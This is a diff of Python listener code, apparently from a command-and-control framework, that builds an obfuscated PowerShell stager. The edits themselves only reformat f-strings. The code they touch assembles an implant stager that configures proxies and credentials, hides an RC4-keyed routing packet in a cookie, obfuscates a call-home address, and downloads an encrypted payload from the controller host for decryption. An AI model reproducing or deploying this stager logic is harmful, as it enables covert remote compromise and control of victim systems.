@@ -200,7 +200,7 @@ class Listener:
             if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
-            stager += f"$u='{ user_agent }';"
+            stager += f"$u='{user_agent}';"
 
             if "https" in host:
                 # allow for self-signed certificates for https connections
@@ -217,7 +217,7 @@ class Listener:
                     else:
                         # TODO: implement form for other proxy
                         stager += "$proxy=New-Object Net.WebProxy;"
-                        stager += f"$proxy.Address = '{ proxy.lower() }';"
+                        stager += f"$proxy.Address = '{proxy.lower()}';"
                         stager += "$wc.Proxy = $proxy;"
 
                     if proxy_creds.lower() == "default":
@@ -229,7 +229,7 @@ class Listener:
                         password = proxy_creds.split(":")[1]
                         domain = username.split("\\")[0]
                         usr = username.split("\\")[1]
-                        stager += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"
+                        stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}', '{domain}');"
                         stager += "$wc.Proxy.Credentials = $netcred;"
 
             # TODO: reimplement stager retries?
@@ -239,10 +239,10 @@ class Listener:
                 for header in customHeaders:
                     headerKey = header.split(":")[0]
                     headerValue = header.split(":")[1]
-                    stager += f'$wc.Headers.Add("{ headerKey }","{ headerValue }");'
+                    stager += f'$wc.Headers.Add("{headerKey}","{headerValue}");'
 
             # code to turn the key string into a byte array
-            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ stagingKey }');"
+            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
 
             # this is the minimized RC4 stager code from rc4.ps1
             stager += listener_util.powershell_rc4()
@@ -251,10 +251,10 @@ class Listener:
             b64RoutingPacket = listenerOptions["RoutingPacket"]["Value"]
 
             # add the RC4 packet to a cookie
-            stager += f'$wc.Headers.Add("Cookie","session={ b64RoutingPacket }");'
+            stager += f'$wc.Headers.Add("Cookie","session={b64RoutingPacket}");'
 
             stager += (
-                f"$ser= { helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
+                f"$ser= {helpers.obfuscate_call_home_address(host)};$t='{stage0}';"
             )
             stager += "$data=$wc.DownloadData($ser+$t);"
             stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
